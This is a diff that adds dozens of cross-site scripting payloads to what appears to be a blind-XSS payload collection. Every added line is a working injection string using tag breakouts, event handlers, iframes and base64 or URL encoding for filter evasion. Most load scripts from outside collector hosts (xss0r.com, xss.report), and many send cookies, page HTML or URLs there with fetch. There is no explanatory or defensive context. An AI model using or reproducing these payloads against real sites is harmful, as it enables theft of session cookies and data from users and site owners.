@@ -26,3 +26,80 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 <script>$.getScript("//xss.report/c/hnterx")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/hnterx";document.body.appendChild(a);
 ';"</scrpt><scrpt/src=//xss.report/c/hnterx></scrpt>
+'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaHVudGVyZXgiO2RvY3VtZW50LmJvZHkuYXBwZW5kKGEpOw=='))//
+"><img src=&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#48;&#114;&#46;&#99;&#111;&#109;&#47;&#99;&#47;&#104;&#117;&#110;&#116;&#101;&#114;&#101;&#120; onerror=&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#115;&#114;&#99;&#41;&#41;>
+'"<img src="https://xss0r.com/c/hunterex" onerror='this.src="https://xss0r.com/c/hunterex"'>
+'"<img src=x onerror='this.src="https://xss0r.com/c/hunterex"'>
+'"<img src=x onerror='fetch("https://xss0r.com/c/hunterex",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
+'"<iframe src='javascript:window.location="https://xss0r.com/c/hunterex"'></iframe>
+'"<iframe srcdoc='<script>window.location="https://xss0r.com/c/hunterex"</script>'></iframe>
+'"<iframe srcdoc='<script>fetch("https://xss0r.com/c/hunterex",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"<object data='javascript:window.location="https://xss0r.com/c/hunterex"'></object>
+<input onfocus='fetch("https://xss0r.com/c/hunterex",{method:"POST",mode:"no-cors"})' autofocus>
+'"<script type="text/javascript" src="https://xss0r.com/c/hunterex"></script>
+'"<script type="module" src="https://xss0r.com/c/hunterex"></script>
+'"<script nomodule src="https://xss0r.com/c/hunterex"></script>
+javascript:window.location="https://xss0r.com/c/hunterex"
+javascript:fetch("https://xss0r.com/c/hunterex")
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss0r.com/c/hunterex"></scrIpt>
+'"<img src="https://xss0r.com/c/hunterex" onerror="this.src='https://xss0r.com/c/hunterex'">
+'"<svg/onload="window.location.href='https://xss0r.com/c/hunterex'">
+'"<audio src onerror='fetch("https://xss0r.com/c/hunterex",{method:"POST",mode:"no-cors"})'>
+'"<script>new Image().src="https://xss0r.com/c/hunterex"</script>
+'"<form action="https://xss0r.com/c/hunterex" method="POST"><input name="data" value=""></form><script>document.forms[0].submit();</script>
+'"<iframe src="javascript:fetch('https://xss0r.com/c/hunterex')"></iframe>
+'"<link rel="stylesheet" href="https://xss0r.com/c/hunterex" onerror='fetch("https://xss0r.com/c/hunterex")'>
+'"<meta http-equiv="refresh" content="0;url=https://xss0r.com/c/hunterex">
+'"<object data="https://xss0r.com/c/hunterex" onerror='this.data="https://xss0r.com/c/hunterex"'></object>
+javascript:fetch("https://xss0r.com/c/hunterex")
+'"<svg/onload="fetch('https://xss0r.com/c/hunterex'">
+{constructor.constructor('fetch("https://xss0r.com/c/hunterex"')()}
+'"<img src=x onerror="fetch('https://xss0r.com/c/hunterex')">
+'"></script></title></textarea><script src=//https://xss0r.com/c/hunterex></script>
+'"<svg/onload='var a="fetch";var b="https://xss0r.com/c/hunterex"; setTimeout(a+"(b)",1000)'>
+'"<iframe src="javascript:setTimeout('fetch(\"https://xss0r.com/c/hunterex\")', 1000)"></iframe>
+'"<form id='xss'><button form='xss' formaction='javascript:fetch("https://xss0r.com/c/hunterex")'>Click Me</button></form>
+'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss0r.com/c/hunterex"></scrIpt>
+'"><img src=x onerror=setTimeout(String.fromCharCode(102,101,116,99,104)+'("https://xss0r.com//hunterex")', 0)>
+'"><script>'/*'/*`/*--><svg onload=fetch("https://xss0r.com/c/hunterex")></script>
+'"?><svg/onload="fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)"//>
+<img src=x onerror="setTimeout(function(){fetch('https://xss0r.com/c/hunterex?data='+document.cookie)},10)"//>
+<input autofocus onfocus="fetch('https://xss0r.com/c/hunterex?token='+document.cookie)"//>
+<iframe src="javascript:void(0)" onload="fetch('https://xss0r.com/c/hunterex?url='+location.href)"//><!--" -->
+'"></title></textarea></script></style></noscript><script src=https://xss0r.com/c/hunterex></script>
+ibrahim'"<script src=https://xss0r.com/c/hunterex></script>
+ibro%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%3E%3C%2Fscript%3E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss0r.com/c/hunterex></scrIpt>
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss0r.com/c/hunterex"></scrIpt>
+-'"><Svg Src=//xss0r.com/c/hunterex/s OnLoad=import(this.getAttribute('src')+0)>
+email%5D=zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%22%3E%3C%2Fscript%3E%40ibro1337%40gmail.com
+<input onmouseover="fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)">
+'"><Svg Src=//xss0r.com/c/hunterex/s OnLoad=import(this.getAttribute('src')+0)>
+'"><Img Src=//xss0r.com/c/hunterex/x Onload=import(src+0)>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:https://xss0r.com/c/hunterex\00?1=1290/.source))//>
+\"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location='https://xss0r.com/c/hunterex?c='+Reflect.get(document,'coo'+'kie')">
+\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss0r.com/c/hunterex'">
+<p><img src="https://xss0r.com/c/hunterex" border="0" />--&gt;</p>
+'"></title></textarea></script></style></noscript><script src=https://xss0r.com/c/hunterex></script>
+‘;"/></textarea></script><script src=//xss0r.com/c/hunterex>
+zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%22%3E%3C%2Fscript%3E%40ibro1337%40gmail.com
+zer0_sec 1"><script src="https://xss0r.com/c/hunterex"></script>@ibro1337@gmail.com
+ibro1337%40gmail.com%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%22%3E%3C%2Fscript%3E
+ibro1337@gmail.com"><script src="https://xss0r.com/c/hunterex"></script>
+{globalThis.constructor("fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)")()}
+ibro1337@gmail.com<!--" --><script src=https://xss0r.com/c/hunterex></script>
+ibro1337%40gmail.com%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%22%3E%3C%2Fscript%3E
+ibro1337@gmail.com"><svg onload="fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)"></svg>
+<iframe src="https://xss0r.com" onload="fetch('https://xss0r.com/c/hunterex?cookie=' + document.cookie)"></iframe>
+</script><Iframe SrcDoc="><script src=https://xss0r.com/c/hunterex></script>">
+%3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%3E%3C%2Fscript%3E%22%3E
+%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fxss0r.com%252Fc%252Fhunterex%253E%253C%252Fscript%253E%2522%253E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss0r.com/c/hunterex"></scrIpt>
+--%3E%3C%2FtiTle%3E%3C%2FstYle%3E%3C%2FtexTarea%3E%3C%2FscrIpt%3E%22%2F%2F%27%2F%2F%3E%3CscrIpt%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%22%3E%3C%2Fscript%3E
+--%253E%253C%252FtiTle%253E%253C%252FstYle%253E%253C%252FtexTarea%253E%253C%252FscrIpt%253E%2522%252F%252F%2527%252F%252F%253E%253CscrIpt%2520src%253D%2522https%253A%252F%252Fxss0r.com%252Fc%252Fhunterex%2522%253E%253C%252Fscript%253E
+javascript://%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%3E%3C%2Fscript%3E
+'"><script src=https://xss0r.com/c/hunterex></script><img src=x onerror=fetch('https://xss0r.com/c/hunterex?c='+document.cookie)>
+javascript://%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fhunterex%3E%3C%2Fscript%3E
+javascript://%27%22%3E%3Csvg%20onmouseover%3D%22fetch('https://xss0r.com/c/hunterex?data='+document.cookie)%22%3E%3C%2Fsvg%3E
+javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)//>
+javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss0r.com/c/hunterex?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
